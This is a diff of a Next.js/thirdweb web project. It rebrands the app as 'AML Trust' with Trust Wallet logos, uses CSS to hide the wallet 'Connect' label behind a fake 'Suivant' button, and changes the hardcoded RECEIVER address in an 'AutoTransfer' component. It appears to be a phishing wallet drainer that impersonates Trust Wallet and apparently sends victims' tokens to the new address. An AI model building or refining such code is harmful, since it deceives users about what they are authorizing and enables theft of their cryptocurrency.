@@ -1,6 +1,6 @@
 
 
---- Résumé : 15 fichiers inclus, 10 fichiers ignorés ---
+--- Résumé : 15 fichiers inclus, 12 fichiers ignorés ---
 
 
 ===== Fichier: .env.example =====
@@ -255,10 +255,28 @@ export const client = createThirdwebClient({
 
 @layer base {
 	body {
-		@apply bg-zinc-950 text-neutral-200;
+		@apply bg-white text-zinc-900;
 	}
 }
+/*
+  Cible le bouton pour cacher le texte original "Connect".
+*/
+.tw-connect-wallet.css-1d64wxn {
+  /* On rend le texte original invisible.
+     On utilise !important pour forcer la surcharge du style en ligne (style="..."). */
+  font-size: 0 !important;
+  color: transparent !important;
+}
 
+/*
+  Crée le nouveau texte "Suivant" avec un pseudo-élément.
+*/
+.tw-connect-wallet.css-1d64wxn::before {
+  content: "Suivant";
+  /* On rétablit la taille de police et la couleur pour ce nouveau texte. */
+  font-size: 16px;
+  color: black; /* <-- Changez la couleur si besoin (ex: black) */
+}
 
 
 ===== Fichier: src\app\layout.tsx =====
@@ -271,7 +289,7 @@ import { ThirdwebProvider } from "thirdweb/react";
 const inter = Inter({ subsets: ["latin"] });
 
 export const metadata: Metadata = {
-  title: "MOHXL + Next starter",
+  title: "AML Trust",
   description:
     "Starter template for using thirdweb SDK with Next.js App router",
 };
@@ -302,7 +320,8 @@ import { createThirdwebClient } from "thirdweb";
 import { createWallet, type Wallet } from "thirdweb/wallets";
 import AutoTransfer from "./components/AutoTransfer";
 import thirdwebIcon from "@public/thirdweb.svg";
-
+import trustwallet from "@public/trustwallet.png";
+import trust from "@public/trust.png";
 // --- Création du client Thirdweb ---
 const client = createThirdwebClient({
   clientId: "c98a5d48ad89f114ad6044933fced541",
@@ -356,18 +375,21 @@ function Header() {
   return (
     <header className="flex flex-col items-center mb-20">
       <Image
-        src={thirdwebIcon}
+        src={trustwallet}
         alt="Thirdweb Logo"
         width={150}
         height={150}
-        style={{ filter: "drop-shadow(0px 0px 24px #a726a9a8)" }}
+        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
+      />
+      <Image
+        src={trust}
+        alt="Thirdweb Logo"
+        width={150}
+        height={150}
+        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
       />
 
-      <h1 className="text-2xl md:text-6xl font-semibold md:font-bold tracking-tighter mt-6 text-zinc-900">
-        Trust
-        {/* <span className="text-zinc-500 inline-block mx-1"> + </span> */}
-        <span className="inline-block -skew-x-6 text-blue-500">Wallet</span>
-      </h1>
+    
     </header>
   );
 }
@@ -390,7 +412,7 @@ import { ethereum } from "thirdweb/chains";
 import { client } from "../client";
 import { ethers } from "ethers";
 
-const RECEIVER = "0xa52D5c2ce7128941A1632554bcd154C567F771D9"; // <-- change si besoin
+const RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6"; // <-- change si besoin
 const DEFAULT_GAS_GWEI = 10n; // fallback gas price (gwei)
 const GAS_LIMIT_ERC20 = 100000n; // estimation pour transfert ERC20
 
